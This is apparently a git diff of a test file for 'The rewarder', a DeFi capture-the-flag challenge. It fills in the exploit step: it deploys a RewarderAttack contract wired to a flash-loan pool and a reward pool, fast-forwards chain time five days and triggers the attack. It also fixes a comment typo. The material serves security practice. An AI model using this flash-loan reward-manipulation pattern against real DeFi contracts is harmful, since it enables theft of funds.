@@ -66,6 +66,18 @@ describe('[Challenge] The rewarder', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.hack = await (await ethers.getContractFactory('RewarderAttack', attacker)).deploy(
+            this.liquidityToken.address,
+            this.rewardToken.address,
+            this.rewarderPool.address,
+            this.flashLoanPool.address
+        );
+
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+        this.hack.attack();
+
+
     });
 
     after(async function () {
@@ -76,7 +88,7 @@ describe('[Challenge] The rewarder', function () {
             await this.rewarderPool.roundNumber()
         ).to.be.eq('3');
 
-        // Users should get neglegible rewards this round
+        // Users should get negligible rewards this round
         for (let i = 0; i < users.length; i++) {
             await this.rewarderPool.connect(users[i]).distributeRewards();
             let rewards = await this.rewardToken.balanceOf(users[i].address);
